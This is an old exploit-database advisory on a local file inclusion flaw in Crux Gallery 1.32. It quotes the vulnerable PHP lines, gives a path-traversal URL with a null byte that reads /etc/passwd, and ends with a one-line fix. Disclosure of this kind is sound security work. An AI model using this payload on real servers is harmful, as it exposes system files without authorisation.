<html><head><title>Crux Gallery <= 1.32 (index.php theme) Local File Inclusion Vulnerability</title></head><pre> ~~+=========================================================+~~
 ~~+=========================================================+~~
  [?] Crux Gallery &lt;= 1.32 Local File Inclusion Vulnerability
  [?] Discovered On: 01/10/2008
  [*] PHP.ini 
  [*] Magic_Quotes_Gpc = Off
 ~~+=========================================================+~~
  (index.php) // Greetz -&gt; Osirys and darkjoker
  14. $m = $_GET['m'];
  15. $p = $_GET['p'];
  16. $dir = $_GET['dir'];
  17. require_once(&quot;main.php&quot;);
  18. require_once(&quot;themes/&quot;.$theme.&quot;/theme.php&quot;); 
  $theme  isn't declared, so you can include any file.
  [*] http//[path]/index.php?theme=../../../../../etc/passwd%00
  [*] How To Fix: declare $theme
  ~~+=========================================================+~~

# milw0rm.com [2008-10-01]</pre></html>